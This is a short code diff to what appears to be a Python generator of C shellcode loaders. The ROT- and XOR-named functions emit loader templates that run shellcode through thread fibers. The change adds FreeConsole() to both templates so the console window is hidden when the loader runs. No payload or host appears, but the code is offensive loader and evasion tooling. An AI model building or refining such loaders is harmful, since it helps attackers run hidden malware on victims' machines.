@@ -11,7 +11,7 @@ def rot_compailed(shellcode_size, shellcode):
     int main()
     {
         
-        
+        FreeConsole();
         PVOID mainFiber = ConvertThreadToFiber(NULL);
     
         unsigned char shellcode[] ;
@@ -45,7 +45,7 @@ def xor_compailed(shellcode_size, shellcode):
     int main()
     {
         
-        
+        FreeConsole();
         PVOID mainFiber = ConvertThreadToFiber(NULL);
     
         unsigned char shellcode[] ;
